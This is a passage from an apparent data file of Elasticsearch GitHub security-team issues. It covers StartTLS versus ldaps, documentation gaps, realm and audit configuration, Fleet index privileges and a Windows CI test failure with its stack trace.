1. StartTLS makes it hard for directory admins to migrate clients off plain-text to TLS. Because they all come in to the same port, and you rely on the client requesting an TLS upgrade, the only tools you have for knowing which clients are using TLS and which aren't is if the server has useful logging for such cases (most don't) or you start doing invasive network sniffing.
2. StartTLS makes it hard for directory admins to mandate TLS unless the server has a flag for that. And if it does, then you've effectively just added a weird protocol layer mechanism to upgrade the connection to TLS which you could have just had from the start by only accepting TLS connections on the ldaps port.
 3. StartTLS makes it hard for clients to enforce TLS. They need to point at the non-TLS port, and then hope that their client upgrades to TLS. It might not - we don't. An `ldaps://` URL makes it clear that this is always going to use TLS. With StartTLS you need some application specific configuration for `startTLS: required` or something like that (not to be confused with `startTLS: true` which would probably just _attempt_ TLS, but continue to use plaintext if the server didn't support it).
4. StartTLS is easily subject to man-in-the-middle attacks unless both sides strictly enforce StartTLS. My MITM can simply tell the client that StartTLS is not supported, and then not pass that command on to the server.
5. StartTLS requires custom code with additional complexity that introduced a class of vulnerabilities that don't exist in `ldaps` (e.g. https://www.kb.cert.org/vuls/id/555316)
6. StartTLS requires both sides to establish untrusted connections plaintext connections and exchange data before they've done any certificate exchange or verification. Related to point 5, that's just asking for a whole class of problems that `ldaps` avoids.

When StartTLS was proposed, TLS was still seen as something that was nice to have, and you could rely on the client and server to negogiate a TLS connection if possible, but fallback to plaintext if that didn't work. That's simply not the current reality. Both the client admin (in our case, the person configuring ES security) and the directory server admin need to have the tools available to be sure that connections are running over TLS with appropriate certificate validation from the start. `ldaps` offers that in a well understood, fairly straightforward way. `StartTLS` can offer _some_ of that, if both sides support all the right configuration options and you know what they are and you set it up correctly.



You have changed my mind on the inferiority of `ldaps`. My preference to StartTLS dates back to a time when eliminating the number of open ports was preferential over considering the actual security and practicality of the port that was to be left open. Further, `ldaps` had been deemed deprecated at that time in favor of the documented standard.

I am glad to be brought up to speed. [IETF opinion change on ""implicit TLS"" vs. StartTLS](http://www.openldap.org/lists/openldap-technical/201802/msg00004.html) appears to be the precursor to the IETF thread you (@tvernum) cited-- both referencing https://tools.ietf.org/html/rfc8314#appendix-A.

So I'm fine to never support StartTLS over LDAP unless we must.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,444720445,"Make builtin privileges docs more explicit ","Some of the builtin privileges have very [brief descriptions](https://www.elastic.co/guide/en/elastic-stack-overview/7.0/security-privileges.html).

Sometimes this leaves security administrators wondering about the exact capabilities that this will grant to users. It is about time that we went through the list and updates the descriptions to be more complete.
 ","Pinging @elastic/es-security[doc issue triage]",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1403818185,"[Test] Ensure unique additional headers","This PR makes sure random additional headers are generated with unique keys so that they can all be inserted into threadContext without conflict.

Resolves: #90766
","Pinging @elastic/es-security (Team:Security)@elasticmachine run elasticsearch-ci/part-2",yes,">test,:Security/Security,Team:Security,v8.6.0,"
elastic/elasticsearch,1328521593,"[DOCS] Overview page for API keys","### Description

We currently only have documentation around concrete APIs for API keys, and no general overview page.

API keys are nuanced, both in terms _when_ they should be used, as well as how their access scope is determined and configured. 

We should introduce an overview page addressing (at a minimum):

- What are API keys and when should they be used?
- How is the access scope of an API key determined (i.e., `role_descriptors` vs. `limited_by_role_descriptors`)?

This would furthermore allow us to move conceptual (and currently duplicated) information from concrete API docs (e.g. the [`role_descriptors` explanation](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-create-api-key.html#security-api-create-api-key-request-body) in the create API key API docs) into the overview page and converge on a single source of truth for these concepts (within ES docs, at least).

Relates: https://github.com/elastic/elasticsearch/pull/88499#discussion_r922952096","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)I've labeled this `team-discuss` to validate that it doesn't clash with any broader efforts around security-related documentation. 

@lockewritesdocs just wanted to confirm: putting together an ES-specific API keys overview page still makes sense, correct?

I'm raising this now, since I will soon work on documentation for the new bulk update route; putting together an overview page first potentially lets us avoid duplicating yet more concepts in the new API docs.>putting together an ES-specific API keys overview page still makes sense, correct?

@n1v0lg, I absolutely think that an overview of API keys makes sense, and is necessary. I'm putting together an outline for an updated security guide, and authenticating with API keys is part of a section that I'm currently calling _Machine authentication_. The main content that's missing for a discussion of API keys is:

* What are the benefits of using them?
* When should you use them?

I think that the answer of when to use them is for when you're authenticating between machines, but we need to put more context around that usage. ",no,">docs,:Security/Security,team-discuss,Team:Docs,Team:Security,"
elastic/elasticsearch,546191004,"Clarify that APIs require authentication in OIDC docs","In https://www.elastic.co/guide/en/elasticsearch/reference/master/oidc-without-kibana.html, we should point out that all calls to the OIDC APIs should be made authenticating as the facilitator user that is created in the first step","Pinging @elastic/es-docs (>docs)Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">docs,:Security/Authentication,Team:Docs,Team:Security,v8.6.0,"
elastic/elasticsearch,554501935,"Move configuration of special realms to additionalSettings","Possibly related: #36591 #50892 

At the moment we have 3 special realms for which we do extra configuration that doesn't use the global `Settings` object.

- We always add a reserved realm, unless it is disabled (through an undocumented config that sitso utside the realm chain).
- We add a native realm and a file realm if there are no other enabled realms (other than reserved).

I would like to consider moving all of that config into the `Settings` object, by implementing it in `Security.additionalSettings()`.

In that method we would:
1. If the YML settings does not include a reservered realm, add one, with order `Integer.MIN_VALUE` 
2. If the YML settings does not include a file realm, add one,  with order `Integer.MIN_VALUE + 1`  
3. If the YML settings does not include a native realm, add one,  with order `Integer.MIN_VALUE + 2`  

When we consider whether the settings includes a realm, we would treat `enabled: false` as being an included realm, so you could explicitly disable any of those 3 realms by adding them to the YML, and setting enabled to false.

This would mean that the node's settings always reflect the actual realm chain.
It would remove the magic setting to disable the reserved realm, and cases where the reserved realm was disabled would be just like any other disabled realm.

We would probably also want to add a validation in `Realms` to check that the reserved realm had the lowest order, and fail if it didn't.

We'd need to think about how this might work with dynamic realm configuration, but it potentially makes it easier by making all the realm stuff be done through `Settings` - it would just required that dynamic node config loading and `additionalSettings` played nicely together. ","Pinging @elastic/es-security (:Security/Authentication)We agreed that this was a reasonable direction to take, but it depends on how #50892 ends up being decided.",no,":Security/Authentication,Team:Security,"
elastic/elasticsearch,627031399,"Review status code caused by SAML exceptions","The method`SamlUtils#samlException(String msg, Object... args)` is used to signify a SAML exception in many places. A large part of this exception is catched in [SamlRealm#authenticate](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/saml/SamlRealm.java#L412), where it is handled internally and not exposed directly to users.

There are however usages in many other places where this exception gets ultimately translated into a `500` status code, which does not always suitable. For example, when a [SAML Request is not signed](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/saml/SamlLogoutRequestHandler.java#L101), it feels more appropriate to return `400`. This issue proposes to review these usages and rationalise the status code in case of error.","Pinging @elastic/es-security (:Security/Authentication)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317450165,"Licensing role","*Original comment by @astefan:*

Would make sense a role and, maybe default user, like this one?

```
POST /_xpack/security/role/license_role
{
  ""cluster"": [""cluster:monitor/xpack/license/*""]
}
POST /_xpack/security/user/licensing_user
{
  ""password"" : ""changeme"",
  ""roles"" : [ ""license_role"" ],
  ""full_name"" : ""Mr License""
}
```

This is for situations where automated license update is used in a puppet/ansible-like environment and for this the most restrictive user possible that can apply that license should be used, since that user is used only for license updates. We don't document the individual, granular permissions anymore, but they are still there. Instead a default user like the one above can be considered?","Discussed in Fix-It-Friday.
This should probably be a privilege rather than a role, so I'm adding it for inclusion in #30078",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317446880,"[Security] Configure Auditing via API","*Original comment by @uboness:*

_From @skearns64 on May 1, 2015 22:25_

This issue tracks the goal of having a configuration API for Shield that covers Audit log settings.




","*Original comment by @uboness:*

pls label
*Original comment by @uboness:*

_From @jaymode on July 9, 2015 17:53_

Currently, we have auditing configuration defined in the `elasticsearch.yml` configuration file with two outputs, `logfile` and `index`. Each of these outputs is also configurable as to what is audited, but in a different manner. The `logfile` output uses logger levels and the `index` output has a much nicer way of configuration. As part of this API, we will need to consolidate the configuration aspect to be much more uniform. With that said, we can then envision an API that looks like:

## Audit API
- PUT `/_shield/auditor/{auditorName}`
- POST `/_shield/auditor/{auditorName}`
- DELETE `/_shield/auditor/{auditorName}`
- GET `/_shield/auditors`

This API allows to retrieve the current auditing configuration and update it.

`GET /_shield/auditors`:

``` json
{
    ""auditors"": [
        {
            ""type"": ""logfile"",
            ""enabled"": true,
            ""events"": {
                  ""include"": [""anonymous_access_denied"", ""authentication_failed"", ""access_granted"", ""access_denied"", ""tampered_request"", ""connection_granted"", ""connection_denied""],
                  ""exclude"": [""system_access_granted""]
            },
            ""settings"": {}
        }
    ]
}
```

Enabling auditing to a logfile:

`POST /_shield/auditors/logfile_auditor`:

``` json
{
    ""type"": ""logfile"",
    ""enabled"": true,
    ""events"": {
        ""include"": [""anonymous_access_denied"", ""authentication_failed"", ""access_granted"", ""access_denied"", ""tampered_request"", ""connection_granted"", ""connection_denied""],
        ""exclude"": [""system_access_granted""]
    },
    ""settings"": {}
}
```

## Permissions
- `shield:audit/view`
- `shield:audit/modify`
- `shield:audit/delete`

## Consider
- Allowing the log location to be specified, allowing for the audit log to be split up.
- Adding APIs to enable/disable specifically
*Original comment by @polyfractal:*

Related: LINK REDACTED which allows dynamically adjusting audit filtering (although not complete configuration as this issue proposes)",no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,1115364873,"Document the `/` API","I searched our docs and didn't see us really document the `/` API. We mention it in examples, but I couldn't find our actual docs for it.

It looks like the official name for this action is `cluster:monitor/main` so to run it you'll need the monitor privilege to run it.","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)I filed this as `:Security/Security` because I think that's the biggest thing the needs documenting.FWIW this is labelled as polling ""ES's Version"" in [the diagnostic](https://github.com/elastic/support-diagnostics/blob/main/src/main/resources/elastic-rest.yml#L313-L316) .Related JSON spec: https://github.com/elastic/elasticsearch/blob/master/rest-api-spec/src/main/resources/rest-api-spec/api/info.json",no,">enhancement,:Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,972367351,"Elasticsearch user, group quotas","Dear Team,

I would like to request the implementation of quotas in Elasticsearch. For example, access to the cluster usage can be restricted based on number of search requests, impact of search requests (heavy aggregation etc.), incoming bandwidth (for ingest roles) and outgoing bandwidth (report generation). Furthermore, additional logging related to these activities can further aid an administrator with the resource usage analysis.
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,934985723,"Kerberos authentication on AD for ELK - AD account authentication for end user","We'd like kibana and elasticsearch authenticate to AD with kerberos (keytab).
Because kerberos is the only authorized solution to authenticate on AD.
Then, end users can provide their AD account (login + password) to connect to kibana.
Case is opened to elasticsearch support but seems that this archi is not possible.
![Archi_kerberos](https://user-images.githubusercontent.com/41614088/124153475-c29cc100-da94-11eb-8e9f-9308230e0b74.jpg)

","Pinging @elastic/es-security (Team:Security)May be related to https://github.com/elastic/elasticsearch/issues/39878
cc @lucabelluccini ",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1237910211,"Enable authentication_success audit logging automatically when emit_request_body is enabled","The underlying request body from `xpack.security.audit.logfile.events.emit_request_body` for queries issued from Kibana Discover is only logged with the `authentication_success` as a `rest` layer audit event:

<img width=""548"" alt=""image"" src=""https://user-images.githubusercontent.com/7216393/168704993-0695055f-f0a6-4cdf-af44-5617027af638.png"">

`authentication_success` is [not](https://www.elastic.co/guide/en/elasticsearch/reference/current/auditing-settings.html#event-audit-settings) an event that is logged by default for audit logging.

It can be helpful if we can internally (automatically) enable `authentication_success` logging when `xpack.security.audit.logfile.events.emit_request_body` is set to `true` without requiring the end user to set `xpack.security.audit.logfile.events.include` themselves :) 

Alternately, make `authentication_success` part of the default `xpack.security.audit.logfile.events.include` array.","Pinging @elastic/es-security (Team:Security)Thanks @ppf2 I think you have a good point here. The only successful event that includes the request body is `authentication_success`. I'd like to think that when user enable request body, they would most likley (if not always) also want `authentication_success` event to be logged. It seems to be an useful feature to have. We will need to work out whether this indicates any ""breaking"" and what if users do want _exclude_ the event explicitly. @albertzaharovits I'd like to learn about your view on this.",no,":Security/Audit,Team:Security,"
elastic/elasticsearch,1073803640,"GET _cluster/settings causes non-actionable deprecation warning","`GET /_cluster/settings?include_defaults=true&flat_settings=true` causes the following deprecation warning header to be returned:

> 299 Elasticsearch-8.1.0-SNAPSHOT-ab4581b805ae15d9e3cf3f41dcc7e0498d4b722b ""[xpack.security.http.ssl.keystore.password] setting was deprecated in Elasticsearch and will be removed in a future release! See the breaking changes documentation for the next major version.""

The deprecation notice only seems to show if the `xpack.security.http.ssl.keystore.password` configuration option is set.

However, it's not obvious to users how they could resolve this deprecation (at least it wasn't to me). By returning a deprecation notice to an API call it creates the impression that the API itself is deprecated, shouldn't config deprecations only be logged when reading the config file on startup? Returning a deprecation log when a deprecated configuration setting is read through an API causes confusion.

In addition, the documentation doesn't mention that this setting has been deprecated https://www.elastic.co/guide/en/elasticsearch/reference/master/security-settings.html

Related: https://github.com/elastic/kibana/issues/120043","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,1044567433,"[Discuss] Add wildcard privileges for dot-prefixed Fleet indices to kibana_system and elastic/fleet-server","As Elastic packages evolve, additional dot-prefixed, hidden indices and data streams are regularly being added that are intended for use exclusively by application code and are not meant to be directly consumed by end-users. Each time one gets added, we have to add additional privileges to the kibana_system role and elastic/fleet-server service account to allow Kibana to install packages and to allow elastic/fleet-server to create valid API keys so that agents can ingest data.

A recent example comes from the Endpoint package which recently added a `.logs-endpoint.action.responses-*` data stream. This required changes to both kibana_system and elastic/fleet-server to update their privileges:
- https://github.com/elastic/elasticsearch/pull/80140
- https://github.com/elastic/elasticsearch/pull/80231

We could make this less burdensome by granting both of these roles/service accounts the index privileges they need to a broader pattern like `.logs-*-*` and `.metrics-*-*` just like we do for the normal non-hidden indices.

Related to https://github.com/elastic/kibana/issues/116715

Additionally, we should probably update all of these non-dot-prefixed index privileges to be `logs-*-*` and `metrics-*-*` instead of `logs-*` and `metrics-*`. This could be considered as a separate issue","Pinging @elastic/es-security (Team:Security)cc @ywangd since you've been helping us out with these changes.Thanks @joshdover, in general that would make sense to me, but we probably need to verify that we are not unintentionally create security issues in the future.

Is there any possible scenario that we can think of where indices in these patterns (e.g. `.logs-*` and `.metrics-*`) will be created but they won't need to be accessed by Fleet or Kibana? IIRC these are not system indices, so potentially users can create their own custom indices matching the pattern.

The main difference that I see with `logs-*`, `metrics-*`, and `traces-*` is that these are well-known and documented as ""reserved"" for Observability use, so it's more unlikely that there may be confusion about their access.It seems we kind of accidentally started to support these `.logs-*-*` indices. Should we make them official supported by also loading the `logs` template in addition for `.logs`. Same for metrics etc.?@jpountz I'm sure you have an opinion / thoughts on the above.> Is there any possible scenario that we can think of where indices in these patterns (e.g. `.logs-*` and `.metrics-*`) will be created but they won't need to be accessed by Fleet or Kibana? IIRC these are not system indices, so potentially users can create their own custom indices matching the pattern.

None that I know of. And correct, they are not system indices at this time. @ruflin are you aware of any other teams using this pattern? I only know of the Endpoint case.

> It seems we kind of accidentally started to support these `.logs-*-*` indices. Should we make them official supported by also loading the `logs` template in addition for `.logs`. Same for metrics etc.?

From my understanding, the base templates are there to cover the case where users just want to start sending data without using Agent. If we don't want customers using these, I don't think we should provide a way to make it easy for them to do so.I am generally OK with the proposal if the index expressions all point to hidden indices and do not clash with data stream backing indices (prefixed with `.ds-`). But in any case, we should make effort to document the namespaces that kibana-system and fleet-server claim. Not sure what would be the best place to document it (ES or Kibana or Fleet or Solution docs?) Do we have something already that can be expanded upon?

> The main difference that I see with logs-*, metrics-*, and traces-* is that these are well-known and documented as ""reserved"" for Observability use, so it's more unlikely that there may be confusion about their access.

@bytebilly Could you please point me to the relevant docs?

> It seems we kind of accidentally started to support these .logs-*-* indices. 

@ruflin Where did we ""accidentally started"" the support? I don't see it supported in ES yet. Do you mean Fleet and Packages?

> Additionally, we should probably update all of these non-dot-prefixed index privileges to be logs-*-* and metrics-*-* instead of logs-* and metrics-*. This could be considered as a separate issue

I think this is a good idea especially since the builtin index templates claim to match the pattern like `logs-*-*`. There is no index template for `traces-*` or `traces-*-*`. I am not sure whether this should follow the same path? Since these index patterns are new in 7.16 for `kibana_system`, we still have time to make the update for it. But `fleet-server` have had privileges over the broader index patterns like `logs-*` since 7.13. If we narrow down the index patterns, can we be sure there won't be any BWC issues?* Accidential support: Yes, in Fleet and packages, not Elasticsearch. If I remember correct, it is a flag in the package so in theory any package could use it.
* .logs pattern: Don't know of any other use case. @joshdover makes a good point here that we likely should not encourage the usage of it. What other options do we have to support the endpoint use case without playing catch up on each change. @kevinlog Do you expect more use of these hidden data streams?
* Breaking change: fleet-server only hands out permissions to Elastic Agent. Elastic Agent enforces the data stream naming scheme which means all data is shipped to ´type-dataset-namespace`. If it breaks something I would consider it a bug in Elastic Agent.>> The main difference that I see with logs-, metrics-, and traces-* is that these are well-known and documented as ""reserved"" for Observability use, so it's more unlikely that there may be confusion about their access.

> @bytebilly Could you please point me to the relevant docs?

@ywangd there is a reference here, but it's not for `traces-*`: https://www.elastic.co/guide/en/fleet/current/data-streams.html#data-streams-index-templates

> It seems we kind of accidentally started to support these .logs-*-* indices. Should we make them official supported by also loading the logs template in addition for .logs. Same for metrics etc.?

I'm not sure I get all the implications. Given that there may be some conflict, I'm wondering if it's not better to add specific indices rather than having a generic pattern. From a process perspective, adding a new index is not so complex and I guess it's not a very frequent operation. What do you think?",no,":Security/Authorization,Team:Security,"
elastic/elasticsearch,575330046,"Rename 'username' to 'name' in SetSecurityUserProcessor","Rename 'username' field to 'name' in order to conform to [ECS](https://www.elastic.co/guide/en/ecs/current/ecs-user.html#_user_field_details) . [#51799](https://github.com/elastic/elasticsearch/issues/51799)","@ShawnLi1014 Thank you for your interest in Elasticsearch.

As you see from the linked issue #51799, this is still marked for discussion, and we have not decided if or when we would make then change.

I don't think this is the best issue for you to work on unless you have some compelling need for that change.
If you're looking for something to work on to contribute to Elasticsearch, we'd recommend looking for issues marked
-  [""Good first issue""](https://github.com/elastic/elasticsearch/issues?q=is%3Aopen+is%3Aissue+label%3A%22good+first+issue%22)
- _or_, [""Help wanted""](https://github.com/elastic/elasticsearch/issues?q=is%3Aopen+is%3Aissue+label%3A%22help+wanted%22+)Pinging @elastic/es-security (:Security/Security)",yes,":Security/Security,Team:Security,"
elastic/elasticsearch,1334169154,"[CI] CertificateToolTests testHandleLongPasswords failing","This fails on Windows X64 only https://gradle-enterprise.elastic.co/scans/tests?search.timeZoneId=Europe/Bucharest&tests.container=org.elasticsearch.xpack.security.cli.CertificateToolTests&tests.test=testHandleLongPasswords with `Password is not ASCII`, but I suspect this is Windows broken way to deal with long passwords, because the passwords are obviously ASCII.

**Build scan:**
https://gradle-enterprise.elastic.co/s/twktttlgsoj2s/tests/:x-pack:plugin:security:cli:test/org.elasticsearch.xpack.security.cli.CertificateToolTests/testHandleLongPasswords

**Reproduction line:**
`gradlew ':x-pack:plugin:security:cli:test' --tests ""org.elasticsearch.xpack.security.cli.CertificateToolTests.testHandleLongPasswords"" -Dtests.seed=B7D8B804254F9FE2 -Dtests.locale=fr-FR -Dtests.timezone=Asia/Taipei -Druntime.java=18`

**Applicable branches:**
main

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.cli.CertificateToolTests&tests.test=testHandleLongPasswords

**Failure excerpt:**
```
java.security.KeyStoreException: Key protection algorithm not found: java.security.UnrecoverableKeyException: Encrypt Private Key failed: getSecretKey failed: Password is not ASCII

  at __randomizedtesting.SeedInfo.seed([B7D8B804254F9FE2:C41897A3DAF3CB3E]:0)
  at sun.security.pkcs12.PKCS12KeyStore.setKeyEntry(PKCS12KeyStore.java:709)
  at sun.security.pkcs12.PKCS12KeyStore.engineSetKeyEntry(PKCS12KeyStore.java:589)
  at sun.security.util.KeyStoreDelegator.engineSetKeyEntry(KeyStoreDelegator.java:112)
  at java.security.KeyStore.setKeyEntry(KeyStore.java:1195)
  at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.lambda$writePkcs12$4(CertificateTool.java:562)
  at org.elasticsearch.xpack.security.cli.CertificateTool.withPassword(CertificateTool.java:1036)
  at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.writePkcs12(CertificateTool.java:560)
  at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.lambda$writeCertificateAuthority$1(CertificateTool.java:939)
  at org.elasticsearch.xpack.security.cli.CertificateTool.fullyWriteFile(CertificateTool.java:1096)
  at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.writeCertificateAuthority(CertificateTool.java:937)
  at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.execute(CertificateTool.java:928)
  at org.elasticsearch.xpack.security.cli.CertificateToolTests.testHandleLongPasswords(CertificateToolTests.java:425)
  at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
  at java.lang.reflect.Method.invoke(Method.java:577)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

  Caused by: java.security.UnrecoverableKeyException: Encrypt Private Key failed: getSecretKey failed: Password is not ASCII

    at sun.security.pkcs12.PKCS12KeyStore.encryptPrivateKey(PKCS12KeyStore.java:957)
    at sun.security.pkcs12.PKCS12KeyStore.setKeyEntry(PKCS12KeyStore.java:631)
    at sun.security.pkcs12.PKCS12KeyStore.engineSetKeyEntry(PKCS12KeyStore.java:589)
    at sun.security.util.KeyStoreDelegator.engineSetKeyEntry(KeyStoreDelegator.java:112)
    at java.security.KeyStore.setKeyEntry(KeyStore.java:1195)
    at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.lambda$writePkcs12$4(CertificateTool.java:562)
    at org.elasticsearch.xpack.security.cli.CertificateTool.withPassword(CertificateTool.java:1036)
    at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.writePkcs12(CertificateTool.java:560)
    at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.lambda$writeCertificateAuthority$1(CertificateTool.java:939)
    at org.elasticsearch.xpack.security.cli.CertificateTool.fullyWriteFile(CertificateTool.java:1096)
    at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.writeCertificateAuthority(CertificateTool.java:937)
    at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.execute(CertificateTool.java:928)
    at org.elasticsearch.xpack.security.cli.CertificateToolTests.testHandleLongPasswords(CertificateToolTests.java:425)
    at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
    at java.lang.reflect.Method.invoke(Method.java:577)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
